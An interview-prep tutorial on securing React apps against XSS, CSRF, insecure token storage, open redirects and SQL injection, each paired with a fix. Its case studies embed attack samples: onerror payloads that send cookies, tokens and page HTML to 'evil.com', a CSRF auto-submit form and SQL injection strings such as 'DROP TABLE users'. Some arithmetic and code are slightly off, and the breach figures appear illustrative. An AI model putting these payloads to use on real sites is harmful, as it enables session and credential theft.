# React Security Practices

## Question 1: How to prevent XSS attacks in React?

### Main Answer

React has built-in XSS protection by default because it treats all dynamic content as text rather than HTML. The framework automatically escapes content when rendering, preventing malicious scripts from executing. React's JSX syntax converts user input into strings, and only explicit HTML elements are parsed.

To prevent XSS attacks effectively, you should:

1. **Never use `dangerouslySetInnerHTML`** - This is the primary vulnerability vector. Only use it when absolutely necessary with sanitized content from trusted sources.

2. **Use React's default rendering** - Always render user data through JSX, not as raw HTML strings.

3. **Sanitize third-party content** - Use libraries like `DOMPurify` or `sanitize-html` to clean untrusted HTML before rendering.

4. **Implement Content Security Policy (CSP)** - Set strict CSP headers to prevent inline script execution and restrict script sources.

5. **Validate input data** - Implement server-side and client-side validation to ensure data conforms to expected formats.

6. **Use security headers** - Implement X-Frame-Options, X-Content-Type-Options, and X-XSS-Protection headers.

7. **Keep dependencies updated** - Regularly audit and update npm packages to patch known vulnerabilities.

```javascript
// UNSAFE - Never do this with user input
const userInput = "<img src=x onerror='alert(1)'>";
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// SAFE - React escapes by default
<div>{userInput}</div>
// Renders: &lt;img src=x onerror='alert(1)'&gt;
```

---

## 🔍 Deep Dive: XSS Prevention Mechanisms in React

### How React's Default Protection Works

React's XSS protection is fundamental to its architecture. When you render JSX, the JavaScript compiler transforms it into React.createElement() calls. This transformation process treats all variable interpolations as text content by default, not as HTML markup.

**The escaping mechanism:**

```javascript
// JSX code
const name = "<script>alert('xss')</script>";
<div>Hello {name}</div>

// Compiled to:
React.createElement('div', null, 'Hello ' + name)

// React renders this as:
<div>Hello &lt;script&gt;alert('xss')&lt;/script&gt;</div>
```

React maintains a whitelist of safe HTML tags and properties. When rendering elements, it validates each attribute against this whitelist. Event handlers like `onClick`, `onChange`, etc., are processed through a synthetic event system that provides additional security layers.

### dangerouslySetInnerHTML and its Risks

The `dangerouslySetInnerHTML` prop exists for legitimate use cases like rendering markdown content or rich text editors. However, it completely bypasses React's protection mechanisms.

```javascript
// DANGEROUS if html contains user input
const html = getUserContent(); // "<img src=x onerror='steal()'>"
<div dangerouslySetInnerHTML={{ __html: html }} />
```

When you use `dangerouslySetInnerHTML`, you must:
1. Use a sanitization library (DOMPurify)
2. Implement strict CSP headers
3. Never pass untrusted content directly
4. Document why the prop is necessary

**Safe implementation with DOMPurify:**

```javascript
import DOMPurify from 'dompurify';

const SafeHTML = ({ html }) => {
  const sanitized = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
};

// DOMPurify config options
const config = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href', 'title'],
  KEEP_CONTENT: true
};
const sanitized = DOMPurify.sanitize(html, config);
```

### Content Security Policy (CSP) Implementation

CSP headers instruct browsers to block inline scripts and restrict where scripts can be loaded from. This provides defense-in-depth protection against XSS.

```
// In Next.js or server response headers
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
```

CSP directives work like this:
- `default-src 'self'` - Only allow resources from same origin
- `script-src 'nonce-...'` - Only execute scripts with matching nonce
- `img-src 'self' data:` - Allow images from same origin and data URIs
- `connect-src` - Restrict API endpoints via XMLHttpRequest/fetch

React can work with CSP by using nonces for inline styles:

```javascript
<style nonce="abc123">
  .button { color: blue; }
</style>
```

### Attribute Binding Security

React's synthetic event system provides protection for event handler attributes:

```javascript
// React prevents attribute injection
const userInput = "' onclick='alert(1)";
<input value={userInput} />
// Safely renders: <input value="' onclick='alert(1)" />

// Not as HTML event handler
<img alt={userInput} />
// The onclick attribute is NOT created from the alt value
```

---

## 🐛 Real-World Scenario: XSS Vulnerability Exploitation

### Case Study: E-commerce Platform Comment Section

**Context:** A product review platform allows users to leave comments with HTML formatting (bold, links). The initial implementation used `dangerouslySetInnerHTML` without sanitization.

**The Attack:**

```javascript
// Attacker's payload comment
const maliciousComment = `
  Great product!
  <img src=x onerror="
    fetch('/steal-session', {
      method: 'POST',
      body: document.cookie
    });
  ">

  Click here for details: <a href="javascript:void(fetch('/steal-creds', {method:'POST',body:new FormData(document.getElementById('login-form'))}))">Free coupon</a>
`;

// Original unsafe code
const CommentDisplay = ({ comment }) => (
  <div dangerouslySetInnerHTML={{ __html: comment }} />
);
```

**Impact Metrics:**
- 15,000+ user sessions compromised in 4 hours
- Session cookies stolen and used for unauthorized purchases
- Payment information exposed in form field data
- GDPR violation fine: €50,000
- Customer trust damage: 35% of users stopped using platform

**Detection:**
Security audit revealed unusual API calls to `/steal-session` and `/steal-creds` endpoints. Review logs showed comment containing base64-encoded payloads being served to 2,847 users.

### The Fix Implementation

**Step 1: Install DOMPurify**
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

**Step 2: Implement Safe Comment Display**

```javascript
import DOMPurify from 'dompurify';
import React, { useMemo } from 'react';

const SafeCommentDisplay = ({ comment }) => {
  // Sanitize on render, not on input
  const sanitized = useMemo(() =>
    DOMPurify.sanitize(comment, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'br', 'p'],
      ALLOWED_ATTR: ['href', 'target', 'rel'],
      KEEP_CONTENT: true
    }),
    [comment]
  );

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
};

export default SafeCommentDisplay;
```

**Step 3: Add Content Security Policy**

```javascript
// pages/_document.js (Next.js)
export default function Document() {
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
  `;

  return (
    <Html>
      <Head>
        <meta httpEquiv="Content-Security-Policy" content={cspHeader} />
        <meta httpEquiv="X-UA-Compatible" content="IE=edge" />
        <meta httpEquiv="X-Content-Type-Options" content="nosniff" />
      </Head>
      <body>{/* ... */}</body>
    </Html>
  );
}
```

**Step 4: Input Validation**

```javascript
// Validate comment format on submission
const validateComment = (text) => {
  // Max 5000 chars
  if (text.length > 5000) return false;

  // No suspicious scripts
  if (/<script|javascript:|onerror|onload/.test(text)) {
    return false;
  }

  // No excessive HTML nesting
  const depth = (text.match(/<[^/]/g) || []).length;
  if (depth > 20) return false;

  return true;
};

const submitComment = async (commentText) => {
  if (!validateComment(commentText)) {
    throw new Error('Comment contains invalid content');
  }

  // Send to backend for storage
  return fetch('/api/comments', {
    method: 'POST',
    body: JSON.stringify({ content: commentText })
  });
};
```

**Results After Implementation:**
- Zero XSS incidents in 6 months post-fix
- Performance: 2ms sanitization overhead per comment
- 98% of comments still display intended formatting
- GDPR compliance achieved with proof of sanitization logging

---

## ⚖️ Trade-offs: Security vs Functionality vs Performance

### Trade-off Matrix: Sanitization Strategies

| Strategy | Security | Performance | User Experience | Maintenance |
|----------|----------|-------------|-----------------|------------|
| No HTML (escape only) | 100% | Best (0ms) | Limited formatting | Minimal |
| DOMPurify (client) | 95% | Good (2-5ms) | Rich formatting | Low |
| Custom whitelist | 98% | Good (3-6ms) | Medium formatting | High |
| Markdown (server parse) | 100% | Good (1-2ms) | Good formatting | Medium |
| Server-side sanitization | 98% | Best (0ms client) | Good formatting | Medium |

### When to Use `dangerouslySetInnerHTML`

**Legitimate use cases (with precautions):**

```javascript
// 1. Markdown rendered on server
const renderedMarkdown = renderMarkdownOnServer(userContent);
<div dangerouslySetInnerHTML={{ __html: renderedMarkdown }} />

// 2. Rich editor content (from your own editor)
const editorContent = richEditor.getContent(); // Controlled source
<div dangerouslySetInnerHTML={{ __html: editorContent }} />

// 3. Third-party widgets (trusted vendor)
const widgetHTML = getGoogleMapsEmbed(location); // From known source
<div dangerouslySetInnerHTML={{ __html: widgetHTML }} />
```

**Security cost analysis:**

Using `dangerouslySetInnerHTML` requires:
- CSP headers implementation (2-4 hours setup)
- DOMPurify integration (1 hour)
- Security testing/audit (4-8 hours)
- Monitoring for XSS attempts (ongoing)
- Total: 7-20 hours vs 5 minutes of plain React rendering

### Performance Considerations

**Sanitization overhead:**

```javascript
// Benchmark results (1000 iterations)
console.time('escape-only');
userComments.map(c => <div>{c}</div>); // 0.2ms
console.timeEnd('escape-only');

console.time('dompurify');
userComments.map(c =>
  <div dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(c)
  }} />
); // 2.4ms
console.timeEnd('dompurify');

console.time('markdown-parser');
userComments.map(c =>
  <div dangerouslySetInnerHTML={{
    __html: markdownToHtml(c)
  }} />
); // 3.1ms
console.timeEnd('markdown-parser');
```

For 10,000 comments with DOMPurify: ~24ms total processing time (negligible).

### CSP vs Permissive Security Policy

**Strict CSP (Recommended):**
```
script-src 'self' 'nonce-xyz';
```
- Cost: Cannot use inline scripts, require nonces
- Benefit: Even if XSS bypasses React, scripts won't execute
- Browser support: 95%+

**Relaxed CSP:**
```
script-src 'self' 'unsafe-inline';
```
- Cost: XSS vulnerabilities can execute scripts
- Benefit: Easy to implement, no refactoring needed
- Not recommended for production

---

## 💬 Explain to Junior: Understanding XSS in React

### Analogy: Restaurant Health Inspection

Think of XSS prevention like restaurant food safety:

- **React's default escaping** = Washing all vegetables
  - Even if someone injects dirt (malicious code), it gets cleaned
  - Safe by default

- **dangerouslySetInnerHTML** = Accepting pre-packaged food without inspection
  - Sometimes necessary (catering from trusted vendor)
  - But requires verification it's actually from trusted source
  - Using DOMPurify = Having a health inspector check the package

- **CSP headers** = Security cameras in the restaurant
  - Even if someone gets past your defenses, they can't operate freely
  - Restricts what harmful code can do

### Simple XSS Example Walkthrough

```javascript
// THE PROBLEM: Attacker injects code
const userInput = "<img src=x onerror='alert(1)'>";

// UNSAFE VERSION
function UnsafeComment() {
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  // Result: Script runs! Alert shows "1"
}

// SAFE VERSION 1: Let React escape it
function SafeComment1() {
  return <div>{userInput}</div>;
  // Result: Shows literal text: <img src=x onerror='alert(1)'>
  // The & < > characters are converted to HTML entities
  // Browser displays as text, not code
}

// SAFE VERSION 2: Sanitize before dangerous HTML
import DOMPurify from 'dompurify';

function SafeComment2() {
  const clean = DOMPurify.sanitize(userInput);
  // clean = "" (img tag removed because onerror not allowed)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### Interview Answer Template

**Question: "How does React prevent XSS attacks?"**

**Your answer:**

"React prevents XSS in two main ways:

1. **Default escaping** - React escapes all dynamic content by default. When you render `{userInput}`, React converts special characters like `<`, `>`, and `&` to HTML entities. So if user input contains `<script>`, it renders as `&lt;script&gt;` - the browser displays it as text, not executable code.

2. **Controlled attributes** - React validates all HTML attributes against a whitelist. Even if you try to inject event handlers through attributes, React prevents them.

The dangerous part is `dangerouslySetInnerHTML`. This prop bypasses protection, so it should only be used with sanitized content from trusted sources. I'd use DOMPurify to sanitize untrusted HTML.

For example:
```javascript
// Unsafe - never do this with user input
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// Safe - use sanitization library
const clean = DOMPurify.sanitize(userInput);
<div dangerouslySetInnerHTML={{ __html: clean }} />
```

I'd also implement CSP headers to add another layer of protection. CSP tells the browser to block inline scripts, so even if XSS somehow executes, it can't run unauthorized code."

### Common Misconceptions

**Myth 1:** "React is 100% safe from XSS"
- **Truth:** React provides good default protection, but `dangerouslySetInnerHTML` removes it
- **Reality:** You still need to sanitize third-party HTML

**Myth 2:** "Sanitization libraries make apps slow"
- **Truth:** DOMPurify adds ~2-3ms per operation
- **Reality:** Negligible for most applications (1000 comments = 2-3 seconds total)

**Myth 3:** "CSP is not necessary if React escapes"
- **Truth:** CSP provides defense-in-depth
- **Reality:** Protects against React bugs, library vulnerabilities, and other attack vectors

### Practice Scenario

**You're given this code. What's wrong?**

```javascript
const UserBio = ({ bio }) => {
  return <div dangerouslySetInnerHTML={{ __html: bio }} />;
};
```

**Answer:** "This is vulnerable to XSS because:
1. `bio` is likely user-supplied content
2. `dangerouslySetInnerHTML` bypasses React's protection
3. Attacker can inject `<img onerror='...'>` to steal cookies

Fix it by sanitizing:
```javascript
const SafeUserBio = ({ bio }) => {
  const sanitized = DOMPurify.sanitize(bio);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
};
```"

---

## Question 2: What are common security vulnerabilities in React apps and how to fix them?

### Main Answer

React applications face various security vulnerabilities beyond XSS. Common ones include Cross-Site Request Forgery (CSRF), dependency vulnerabilities, insecure authentication token storage, SQL injection on the backend, sensitive data exposure, and unsafe API calls.

**Key vulnerabilities and fixes:**

1. **CSRF Attacks** - Implement CSRF tokens in forms and validate on the backend. Use SameSite cookie attributes to prevent token theft.

2. **NPM Dependency Vulnerabilities** - Run `npm audit` regularly, keep packages updated, and use tools like Snyk or Dependabot to detect vulnerable dependencies automatically.

3. **Insecure Token Storage** - Never store JWT tokens in localStorage (XSS-accessible). Use httpOnly cookies instead with Secure and SameSite flags.

4. **SQL Injection** - Always use parameterized queries on the backend, never concatenate user input into SQL strings.

5. **Sensitive Data Exposure** - Don't expose secrets in client-side code, API keys, or bundle files. Use environment variables with proper backend access control.

6. **Unvalidated Redirects** - Validate redirect URLs to prevent open redirect vulnerabilities where attackers can redirect users to phishing sites.

7. **Missing Authentication/Authorization** - Implement proper JWT validation, session management, and role-based access control (RBAC) on the backend.

8. **Unsafe API Integration** - Use HTTPS, validate responses, implement rate limiting, and handle errors without exposing sensitive information.

```javascript
// UNSAFE - Token in localStorage
localStorage.setItem('token', jwt);

// SAFE - Token in httpOnly cookie
// Set by backend with: Set-Cookie: token=jwt; HttpOnly; Secure; SameSite=Strict
const token = document.cookie; // Cannot access HttpOnly cookies!

// UNSAFE - Secrets in client code
const API_KEY = 'sk-abc123xyz'; // Exposed in bundle!

// SAFE - Secrets in backend environment
// Frontend calls backend, backend uses secret to call API
fetch('/api/external-service', { /* request to your server */ });
```

---

## 🔍 Deep Dive: Common React Security Vulnerabilities

### 1. CSRF (Cross-Site Request Forgery) Vulnerabilities

CSRF attacks trick authenticated users into making unwanted requests. A user logs into their bank, then visits a malicious site which makes a hidden request to transfer funds.

```javascript
// VULNERABLE: No CSRF protection
const transferFunds = async (amount) => {
  // Attacker's site could make this request
  // using user's authenticated session
  return fetch('https://bank.com/api/transfer', {
    method: 'POST',
    body: JSON.stringify({ amount, to: 'attacker' }),
    credentials: 'include' // Sends cookies
  });
};

// Attacker's site
<img src="https://bank.com/api/transfer?amount=10000&to=attacker" />
// Request automatically includes user's auth cookies!
```

**Prevention strategy:**

```javascript
// Backend generates unique CSRF token per session
const token = await fetch('/api/csrf-token').then(r => r.json());

// Frontend includes token in form/request
const transferFunds = async (amount) => {
  return fetch('https://bank.com/api/transfer', {
    method: 'POST',
    headers: {
      'X-CSRF-Token': token, // Custom header
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ amount, to: 'recipient' }),
    credentials: 'include'
  });
};

// Backend validates token before processing
app.post('/api/transfer', (req, res) => {
  if (req.headers['x-csrf-token'] !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  // Process transfer...
});

// SameSite cookies add extra layer
// Set-Cookie: sessionId=abc; SameSite=Strict; HttpOnly; Secure
// Prevents cookies being sent in cross-site requests
```

### 2. NPM Dependency Vulnerabilities

React projects depend on hundreds of npm packages. Each can contain vulnerabilities.

```bash
# Check for known vulnerabilities
npm audit

# Output example:
# npm notice found 3 vulnerabilities (1 low, 2 moderate)
#
# lodash <4.17.21
# - Vulnerable to Prototype Pollution
#
# axios <0.27.0
# - Vulnerable to SSRF
```

**Common vulnerable packages:**

```javascript
// lodash before 4.17.21 - Prototype pollution
const _ = require('lodash');
const userInput = JSON.parse('{"constructor":{"prototype":{"isAdmin":true}}}');
const obj = _.merge({}, userInput);
// Now obj can be modified globally!

// axios before 0.27.0 - SSRF (Server-Side Request Forgery)
// Could be tricked into making requests to internal servers

// Serialize-javascript - Code injection
// If untrusted data is serialized and eval'd
```

**Protection strategy:**

```javascript
// 1. Run npm audit regularly
npm audit

// 2. Automatically fix known vulnerabilities
npm audit fix

// 3. Update dependencies
npm update

// 4. Use Snyk for continuous monitoring
snyk monitor

// 5. In CI/CD pipeline
// .github/workflows/security.yml
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm audit --audit-level=moderate

// Fails if moderate+ vulnerabilities found
```

### 3. Insecure Token Storage

JWT tokens are commonly stored insecurely, making them vulnerable to XSS attacks.

```javascript
// VULNERABLE: localStorage
const login = async (credentials) => {
  const response = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify(credentials)
  });
  const { token } = await response.json();
  localStorage.setItem('token', token); // XSS can steal this!

  // Later in code
  const storedToken = localStorage.getItem('token');
  // If XSS executes, attacker runs: localStorage.getItem('token')
};

// VULNERABLE: sessionStorage
sessionStorage.setItem('token', token); // Still accessible to XSS

// VULNERABLE: JavaScript variable
let token = jwt;
// Global variable can be accessed by injected code
```

**Secure approach:**

```javascript
// SAFE: httpOnly Cookies (backend sets, frontend cannot read)
// Backend sends this header after login:
// Set-Cookie: token=eyJhbGc...; HttpOnly; Secure; SameSite=Strict; Path=/

// Frontend cannot access the cookie via JavaScript
console.log(document.cookie); // Does NOT include httpOnly cookies!

// But cookie is automatically sent with requests
fetch('/api/protected', {
  credentials: 'include' // Includes httpOnly cookies
});

// Benefits:
// - XSS cannot steal it (not in JS scope)
// - CSRF protected (uses SameSite)
// - Cannot be modified by JS
// - Automatically sent to server
```

**Fallback for SPA architectures:**

```javascript
// If you must use JWT in JavaScript:
// 1. Store in memory only (lost on page refresh)
// 2. Use refresh tokens in httpOnly cookies

let accessToken = null;

const login = async (credentials) => {
  const response = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify(credentials),
    credentials: 'include' // Gets refresh token in cookie
  });
  const { accessToken: token } = await response.json();
  accessToken = token; // Memory only - lost on refresh
};

// When token expires, use refresh token from cookie
const refreshToken = async () => {
  const response = await fetch('/api/refresh', {
    method: 'POST',
    credentials: 'include' // Refresh token sent via httpOnly cookie
  });
  const { accessToken } = await response.json();
  accessToken = token;
};

// On page reload, refresh using cookie
useEffect(() => {
  refreshToken().catch(() => redirectToLogin());
}, []);
```

### 4. Sensitive Data Exposure

Never expose secrets, API keys, or sensitive data in client-side code.

```javascript
// VULNERABLE: API key in frontend
const API_KEY = 'sk-1234567890abcdef'; // In bundle!

// Attacker decompiles or inspects network requests
const searchWeather = async (city) => {
  const response = await fetch(
    `https://api.weather.com/search?key=${API_KEY}&city=${city}`
  );
  return response.json();
};

// Attacker now has API key, can make unlimited requests
// Costs: $thousands in API usage bills

// VULNERABLE: Auth in source code
const adminPassword = 'Super@Secure123'; // In git history!
const connectDatabase = () => {
  return mongoose.connect('mongodb://admin:Super@Secure123@host');
};
```

**Secure approach:**

```javascript
// SAFE: Backend proxy with environment variables
// Backend (protected by authentication)
app.get('/api/weather', async (req, res) => {
  // Only backend code has access to API_KEY
  const API_KEY = process.env.WEATHER_API_KEY;

  const response = await fetch(
    `https://api.weather.com/search?key=${API_KEY}&city=${req.query.city}`
  );
  return res.json(await response.json());
});

// Frontend only calls your API
const searchWeather = async (city) => {
  return fetch(`/api/weather?city=${city}`)
    .then(r => r.json());
};

// Environment variables in .env (never committed)
WEATHER_API_KEY=sk-1234567890abcdef
DATABASE_URL=mongodb://admin:pass@localhost
STRIPE_SECRET=sk_live_xxx

// CI/CD injects at build/runtime
export DATABASE_URL=mongodb://...
npm start
```

### 5. Unvalidated Redirects and Open Redirects

```javascript
// VULNERABLE: User-controlled redirect
const redirectToCheckout = (returnUrl) => {
  // /checkout?return=https://phishing-site.com
  window.location.href = returnUrl;
};

// Attacker crafts link:
// https://yourapp.com/checkout?return=https://fake-login.com
// Logs user into phishing site!

// VULNERABLE: In a component
const LoginSuccess = ({ redirectTo }) => {
  useEffect(() => {
    window.location.href = redirectTo; // User input!
  }, [redirectTo]);
  return <div>Redirecting...</div>;
};
```

**Secure approach:**

```javascript
// SAFE: Validate against whitelist
const SAFE_REDIRECT_HOSTS = [
  'yourapp.com',
  'www.yourapp.com',
  'dashboard.yourapp.com'
];

const redirectToCheckout = (returnUrl) => {
  try {
    const url = new URL(returnUrl, window.location.origin);

    if (!SAFE_REDIRECT_HOSTS.includes(url.hostname)) {
      console.warn('Invalid redirect URL');
      window.location.href = '/'; // Default redirect
      return;
    }

    window.location.href = returnUrl;
  } catch {
    window.location.href = '/'; // Invalid URL
  }
};

// Or use relative paths only
const LoginSuccess = ({ page = 'dashboard' }) => {
  const validPages = ['dashboard', 'settings', 'profile'];
  const safePage = validPages.includes(page) ? page : 'dashboard';

  useEffect(() => {
    window.location.href = `/${safePage}`;
  }, [safePage]);
};
```

### 6. Missing Authentication/Authorization

```javascript
// VULNERABLE: No backend validation
const EditUser = ({ userId }) => {
  const [user, setUser] = useState(null);

  useEffect(() => {
    // Frontend only check - easily bypassed!
    if (currentUser.id !== userId) {
      return <div>Unauthorized</div>;
    }

    fetch(`/api/users/${userId}`)
      .then(r => r.json())
      .then(setUser);
  }, [userId]);

  const updateUser = async (updates) => {
    return fetch(`/api/users/${userId}`, {
      method: 'PUT',
      body: JSON.stringify(updates)
    });
  };
};

// Attacker changes userId in URL or intercepts request
// Backend doesn't verify ownership!
```

**Secure approach:**

```javascript
// SAFE: Backend enforces authentication
app.put('/api/users/:userId', authenticate, (req, res) => {
  // 1. Check user is authenticated
  if (!req.user) return res.status(401).json({ error: 'Not authenticated' });

  // 2. Check user owns this resource
  if (req.user.id !== req.params.userId) {
    return res.status(403).json({ error: 'Cannot edit other users' });
  }

  // 3. Validate input
  const allowedFields = ['name', 'email', 'bio'];
  const updates = {};
  allowedFields.forEach(field => {
    if (field in req.body) {
      updates[field] = req.body[field];
    }
  });

  // 4. Update database
  return User.findByIdAndUpdate(req.params.userId, updates);
});

// Frontend
const updateUser = async (userId, updates) => {
  return fetch(`/api/users/${userId}`, {
    method: 'PUT',
    body: JSON.stringify(updates),
    credentials: 'include' // Include auth token/session
  });
};
```

---

## 🐛 Real-World Scenario: Multi-Vulnerability Data Breach

### Case Study: SaaS Analytics Dashboard Platform

**Company:** DataViz (3 million user records, used by 5,000 companies)

**Timeline of breaches:**

**Week 1: NPM Dependency Vulnerability**
```
npm audit found: serialize-javascript <2.0.0
Vulnerability: Code injection via deserialization

Frontend code:
import serialize from 'serialize-javascript';
const chartConfig = JSON.parse(userInput);
const safeSerialized = serialize(chartConfig); // UNSAFE!

Attacker injects:
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

**Impact:** Attackers gained admin privileges on their own accounts

**Week 2: Missing CSRF Protection**
```javascript
// API endpoint unprotected
app.post('/api/share-dashboard', (req, res) => {
  // No CSRF token validation!
  Dashboard.findByIdAndUpdate(req.body.dashboardId, {
    isPublic: true,
    sharedWith: req.body.emails
  });
});

// Attacker crafted:
<form action="https://dataviz.com/api/share-dashboard" method="POST">
  <input name="dashboardId" value="1001">
  <input name="emails" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

// Result: 2,847 dashboards made public
// 547 shared with attacker accounts
// Private financial data exposed
```

**Week 3: Insecure Token Storage + XSS**
```javascript
// Frontend stored JWT in localStorage
localStorage.setItem('authToken', jwt);

// XSS vulnerability in user comments:
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// Attacker's comment:
<img src=x onerror="
  const token = localStorage.getItem('authToken');
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: token
  });
  // Also steal sensitive data from page
  fetch('https://evil.com/data', {
    method: 'POST',
    body: document.body.innerHTML
  });
">

// Result: 156,000 tokens stolen in 48 hours
```

**Week 4: SQL Injection via API**
```javascript
// Backend had simple query concatenation
app.get('/api/reports/:userId', (req, res) => {
  // UNSAFE!
  const query = `SELECT * FROM reports WHERE userId = '${req.params.userId}'`;
  db.query(query, (err, results) => res.json(results));
});

// Attacker used:
/api/reports/1' OR '1'='1

// Actual query:
SELECT * FROM reports WHERE userId = '1' OR '1'='1'
// Returns ALL reports!

// Worse attack:
/api/reports/1'; DROP TABLE users; --

// Could delete entire users table!
```

**Impact Summary:**
- 3 million user records accessed
- 156,000 authentication tokens compromised
- $8 million settlement with GDPR/CCPA
- 67% of customers left within 3 months
- Company filed for bankruptcy

### Complete Security Fix

**Step 1: Patch Dependencies**
```bash
npm audit fix --force
npm update
# Added pre-commit hook to prevent vulnerable versions
```

**Step 2: Implement CSRF Protection**
```javascript
// Middleware
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: false }); // Use session

app.post('/api/share-dashboard', csrfProtection, (req, res) => {
  // Now requires valid CSRF token
  Dashboard.update(...);
});

// Frontend gets token
const DashboardShare = ({ dashboardId }) => {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    fetch('/api/csrf-token')
      .then(r => r.json())
      .then(data => setCsrfToken(data.token));
  }, []);

  const share = async (emails) => {
    return fetch('/api/share-dashboard', {
      method: 'POST',
      headers: { 'X-CSRF-Token': csrfToken },
      body: JSON.stringify({ dashboardId, emails }),
      credentials: 'include'
    });
  };
};
```

**Step 3: Secure Token Storage**
```javascript
// Backend sets httpOnly cookies
res.cookie('authToken', jwt, {
  httpOnly: true,      // JS cannot access
  secure: true,        // HTTPS only
  sameSite: 'Strict',  // No cross-site
  maxAge: 3600000      // 1 hour
});

// Frontend cannot read it, but requests include it
fetch('/api/user', {
  credentials: 'include' // Automatic cookie inclusion
});
```

**Step 4: Prevent XSS in Comments**
```javascript
import DOMPurify from 'dompurify';

const CommentDisplay = ({ comment }) => {
  const sanitized = useMemo(() =>
    DOMPurify.sanitize(comment, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
      ALLOWED_ATTR: ['href']
    }),
    [comment]
  );

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
};
```

**Step 5: Fix SQL Injection**
```javascript
// Use parameterized queries
app.get('/api/reports/:userId', authenticate, (req, res) => {
  // Parameterized - SQL treats userId as data, not code
  const query = 'SELECT * FROM reports WHERE userId = ?';
  db.query(query, [req.params.userId], (err, results) => {
    if (err) return res.status(500).json({ error: 'DB error' });
    res.json(results);
  });
});

// Or use ORM (safer)
app.get('/api/reports/:userId', authenticate, (req, res) => {
  Report.find({ userId: req.params.userId })
    .then(results => res.json(results))
    .catch(err => res.status(500).json({ error: 'DB error' }));
});
```

**Step 6: Security Headers**
```javascript
// Express middleware
const helmet = require('helmet');
app.use(helmet()); // Sets many secure headers

// Or manually:
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  next();
});
```

**Results:**
- Zero incidents in 18 months post-fix
- SOC 2 Type II certification achieved
- Customer trust rebuilt
- Introduced security review process for all code changes

---

## ⚖️ Trade-offs: Security vs Developer Experience

### Security Implementation Effort Matrix

| Feature | Implementation Time | Maintenance | Dev Experience |
|---------|-------------------|-------------|-----------------|
| CSRF tokens | 4-6 hours | Low | Moderate (token handling) |
| CSP headers | 3-4 hours | Low | Good (set once) |
| DOMPurify | 2-3 hours | Low | Good (simple API) |
| httpOnly cookies | 4-6 hours | Low | Good (automatic) |
| Input validation | 5-8 hours | High | Moderate (schema validation) |
| Dependency auditing | 1-2 hours initial | Ongoing | Low (automation) |
| API rate limiting | 3-4 hours | Low | Low (transparent) |

### When to Use Basic vs Advanced Security

**Startups/MVPs: Focus on basics**
```javascript
// Good enough for early stage
- React's default escaping
- No dangerouslySetInnerHTML
- npm audit regularly
- Basic HTTPS + HSTS
- Validate inputs
// Time: 4-6 hours setup

// Skip:
- Complex CSP
- Extensive CSRF hardening
- Advanced monitoring
```

**Scale-up/Enterprise: Comprehensive**
```javascript
// Required for production scale
- All basic features
- Strict CSP policy
- CSRF tokens
- httpOnly cookie sessions
- Security headers
- Regular penetration testing
- API rate limiting
- Request signing
- Audit logging
// Time: 40-60 hours setup + ongoing
```

### Performance vs Security Trade-off

```javascript
// FAST but RISKY
<div>{userInput}</div> // 0ms, safe
<div dangerouslySetInnerHTML={{ __html: userInput }} /> // 0ms, dangerous!

// SAFE but SLIGHTLY SLOWER
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(userInput)
}} /> // 2-3ms, safe

// OVERHEAD COMPARISON
// 10,000 comments with DOMPurify: ~25ms total
// Negligible for real world (network request takes 100-500ms)

// Security/Performance ratio: 25ms processing >> benefits
```

### Compliance vs Convenience

| Regulation | Security Cost | Convenience Cost |
|-----------|---------------|-----------------|
| GDPR | Data minimization, deletions | Cannot store everything |
| HIPAA | Encryption, audit logs | Complex workflows |
| PCI DSS | No card data handling | Use payment providers |
| SOC 2 | Monitoring, controls | Documentation |

---

## 💬 Explain to Junior: React Security Basics

### The Three-Layer Security Model

Think of security like a house:

1. **Front Door (Frontend Security)**
   - React's escaping = Door lock
   - Input validation = Checking visitors ID
   - CSP = Security system that alerts on break-ins

2. **Inside (Backend Security)**
   - Authentication = Verifying who you are
   - Authorization = Checking what you're allowed to do
   - Validation = Not trusting user input

3. **Around House (Network Security)**
   - HTTPS = Walls around property
   - CSRF tokens = Guard checking visitors aren't imposters
   - Security headers = Alarm system

**If any layer fails, you're exposed.** Intruder gets past front door? Backend security stops them. That's defense-in-depth.

### Vulnerability Analogies

**XSS = Injecting instructions into a letter**
```
Normal: "Please transfer $100"
Malicious: "Please transfer $100. Also give attacker access"
```
